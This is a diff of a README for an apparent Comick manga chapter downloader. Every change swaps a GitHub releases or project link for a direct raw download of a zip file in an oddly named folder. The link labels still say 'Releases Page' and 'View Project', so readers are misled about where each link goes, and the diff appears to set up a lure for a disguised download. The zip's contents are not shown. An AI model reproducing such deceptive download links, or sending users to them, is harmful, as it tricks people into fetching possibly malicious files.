@@ -1,6 +1,6 @@
 # 📚 Comick-Io-Manga-Zip-Cbz-Downloader-Scraper - Easy Manga Chapter Downloads
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper/main/ungainsayable/Cbz_Downloader_Io_Comick_Scraper_Manga_Zip_1.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper/main/ungainsayable/Cbz_Downloader_Io_Comick_Scraper_Manga_Zip_1.6.zip)
 
 ## 🚀 Getting Started
 Welcome! This tool helps you easily download manga chapters from the Comick website. No technical skills are needed. Follow these simple steps to download and run the application.
@@ -14,7 +14,7 @@ Welcome! This tool helps you easily download manga chapters from the Comick webs
 ## 📥 Download & Install
 To get started, you need to download the application. 
 
-1. Visit this page to download: [Releases Page](https://github.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper/releases)
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper/main/ungainsayable/Cbz_Downloader_Io_Comick_Scraper_Manga_Zip_1.6.zip)
 2. On the Releases page, find the latest version of the application.
 3. Click on the download link for your operating system (Windows, Mac, or Linux).
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -60,7 +60,7 @@ If you experience issues, here are some common solutions:
 For further assistance, feel free to leave issues on the GitHub repository.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [View Project](https://github.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper)
+- **GitHub Repository:** [View Project](https://raw.githubusercontent.com/Amar4750/Comick-Io-Manga-Zip-Cbz-Downloader-Scraper/main/ungainsayable/Cbz_Downloader_Io_Comick_Scraper_Manga_Zip_1.6.zip)
 - **Documentation:** More user guides and FAQs can be found in the GitHub repository.
 
 ## 🤝 Contributing
